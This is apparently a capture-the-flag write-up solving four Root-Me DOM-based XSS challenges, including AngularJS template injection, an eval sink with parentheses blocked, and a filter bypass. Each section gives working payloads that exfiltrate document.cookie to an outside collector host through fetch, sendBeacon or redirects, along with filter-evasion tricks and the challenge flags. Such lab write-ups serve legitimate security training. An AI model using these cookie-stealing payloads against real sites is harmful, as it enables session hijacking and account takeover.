# XSS Dom Based

## Introduction

### Description

Steal the admin’s session cookie.

[Start the challenge](http://challenge01.root-me.org/web-client/ch32/)

### Solution

![xss-dom-based.png](/assets/ctf/root-me/xss-dom-based.png)

[http://challenge01.root-me.org/web-client/ch32/index.php?number=1](http://challenge01.root-me.org/web-client/ch32/index.php?number=1) - number value is passed from GET request

```html
<script>
	var random = Math.random() * (99);
	var number = '"h1';
	if(random == number) {
		document.getElementById('state').style.color = 'green';
		document.getElementById('state').innerHTML = 'You won this game but you don\'t have the flag ;)';
	}
	else{
		document.getElementById('state').style.color = 'red';
		document.getElementById('state').innerText = 'Sorry, wrong answer ! The right answer was ' + random;
	}
</script>
```

If `number` parameter exists, then this code block is added and `number` variable is dynamically updated from whatever you pass, no sanitization.

![xss-dom-based-1.png](/assets/ctf/root-me/xss-dom-based-1.png)

Pop alert: [http://challenge01.root-me.org/web-client/ch32/index.php?number=96.22673853278908%27;alert(1);//](http://challenge01.root-me.org/web-client/ch32/index.php?number=96.22673853278908%27;alert(1);//)

Not sure why, but following payloads didn't get callback
```html
1'; navigator.sendBeacon("https://uwuos2.free.beeceptor.com/", document.cookie); //
1'; fetch("https://uwuos2.free.beeceptor.com/?c="%2Bdocument.cookie,{"mode":"no-cors"}); //
```

But this one did
```html
1'; document.location="https://uwuos2.free.beeceptor.com/?c="%2Bdocument.cookie; //
```

::: tip Flag
`rootme{XSS_D0M_BaSed_InTr0}`
:::

## AngularJS

### Description

Steal the admin’s session cookie.

[Start the challenge](http://challenge01.root-me.org/web-client/ch35/)

### Solution

When we start typing name the `password` is filled out automatically. When pressing `Create` we get some number which should be encoded username (?)

![xss-dom-based-2.png](/assets/ctf/root-me/xss-dom-based-2.png)

Name is passed using GET param: [challenge01.root-me.org/web-client/ch35/?name=letmein](challenge01.root-me.org/web-client/ch35/?name=letmein)

Like last time it's loading into `name` variable dynamically
```html
<script>
	var name = 'letmein';
	var encoded = '';
	for(let i = 0; i < name.length; i++) {
		encoded += name[i] ^ Math.floor(Math.random() * name.length);
	}
	encoded = Math.abs(encoded ^ Math.floor(Math.random() * name.length));
	document.getElementById('name_encoded').innerText += ' ' + encoded;
</script>
```

We are not able to use `'` to escape the quotation, but other symbols seem to be accepted. Also `\` is accepted, but then string breaks.

Considering the challenge name it's not a normal HTML so some research: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/5%20-%20XSS%20in%20Angular.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/5%20-%20XSS%20in%20Angular.md)

Hmm... looks like first we must escape the quote.

`{{constructor.constructor('alert(1)')()}}` generates an alert

![xss-dom-based-3.png](/assets/ctf/root-me/xss-dom-based-3.png)

I thought I had to escape quotes, but nope.

```html
{{constructor.constructor("document.location=`https://uwuos2.free.beeceptor.com/?c=${document.cookie}`")()}}

http://challenge01.root-me.org/web-client/ch35/?name={{constructor.constructor("document.location=`https://uwuos2.free.beeceptor.com/?c=${document.cookie}`")()}}
```

> **Note**: Callback took some time

::: tip Flag
`rootme{@NGu1@R_J$_1$_C001}`
:::

## Eval

### Description

Steal the admin’s session cookie.

[Start the challenge](http://challenge01.root-me.org/web-client/ch34/)

### Solution

![xss-dom-based-4.png](/assets/ctf/root-me/xss-dom-based-4.png)

Calculate value is accepted from GET request: [http://challenge01.root-me.org/web-client/ch34/?calculation=xxx](http://challenge01.root-me.org/web-client/ch34/?calculation=xxx)

If we put mathematical expression like `1+1` we get `2`

![xss-dom-based-5.png](/assets/ctf/root-me/xss-dom-based-5.png)

If we had to guess input is using `eval` to get results.

If we do `1+alert()` it responds with `These caracteres: () are forbidden because some evil people tried to exploit my website :'(`

If parameter exists then the code is added.
```html
<script>
	var result = eval(1+1);
	document.getElementById('state').innerText = '1+1 = ' + result;
</script>
```

To get XSS we need valid expression and bypass parenthesis.

[Invoking a function without parentheses](https://stackoverflow.com/a/35949617)
[https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#tagged_templates](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#tagged_templates)

```html
1+1+alert`1` -> Triggers alert
```

Hmm... If we want to create a fetch with cookies we need to concatenate strings and with Tagged Templates we can't achieve that as we are allowed single parameter..

Going back to code block PHP places our input into 2 places: 1. eval, 2. innerText. Since `eval` is not nice enough to work, we could try probing `innerText`. To get `innerText` to execute code we need such payload which satisfied both eval and innerText.

Multiline comments work as long as nothing comes after them

![xss-dom-based-6.png](/assets/ctf/root-me/xss-dom-based-6.png)

Following payload can be used to sandwich the values. 
- Payload must start with valid expression.
- Then multiline comments, because single line comments will cancel `);` part and eval will fail.
- Then single quotes to escape from `innerText` string. Around the payload to keep syntax valid.
- Anything in between should be valid JS without `()`
```js
1+1/*';alert`1`;'*/
```

![xss-dom-based-7.png](/assets/ctf/root-me/xss-dom-based-7.png)

```
1+1/*';document.location=`https://uwuos2.free.beeceptor.com/?c=`+document.cookie;'*/
http://challenge01.root-me.org/web-client/ch34/?calculation=1%2B1%2F*%27%3Bdocument.location%3D%60https%3A%2F%2Fuwuos2.free.beeceptor.com%2F%3Fc%3D%60%2Bdocument.cookie%3B%27*%2F
```

>Flag: `rootme{Eval_Is_DangER0us}`

## Filters Bypass

### Description

Steal the admin’s session cookie.

[Start the challenge](http://challenge01.root-me.org/web-client/ch33/)

### Solution

![xss-dom-based-8.png](/assets/ctf/root-me/xss-dom-based-8.png)

```html
<script>
var random = Math.random() * (99);
var number = '1';
if(random == number) {
	document.getElementById('state').style.color = 'green';
	document.getElementById('state').innerHTML = 'You won this game but you don\'t have the flag ;)';
}
else{
	document.getElementById('state').style.color = 'red';
	document.getElementById('state').innerText = 'Sorry, wrong answer ! The right answer was ' + random;
}
</script>
```

There's a filter which doesn't allow using `;`, but  newline works.
```
Payload: 1'\ndocument.location=`https://uwuos2.free.beeceptor.com/?c=`+document.cookie//
URL: http://challenge01.root-me.org/web-client/ch33/?number=1%27%0Adocument.location=`https://uwuos2.free.beeceptor.com/?c=`%2Bdocument.cookie;//
```

We can't get payload to execute because of filter: `Are you trying a redirect ??`

`+`  and `http` was also blocked

Final payload
```
Payload: 1'\nfetch(`//uwuos2.free.beeceptor.com/?c=`.concat(document.cookie))//
http://challenge01.root-me.org/web-client/ch33/?number=1%27%0Afetch(`//uwuos2.free.beeceptor.com/?c=`.concat(document.cookie))//
```

Hmm... the payload worked for me, but no callback from bot.

Alternatively we could redirect:
```
Payload: 1'\ndocument.location=`//uwuos2.free.beeceptor.com/?c=`.concat(document.cookie)//
URL: http://challenge01.root-me.org/web-client/ch33/?number=1%27%0Adocument.location=`//uwuos2.free.beeceptor.com/?c=`.concat(document.cookie)//
```

> **Note**: Callback took a lot more then it should have taken..

::: tip Flag
`rootme{FilTERS_ByPass_DOm_BASEd_XSS}`
:::
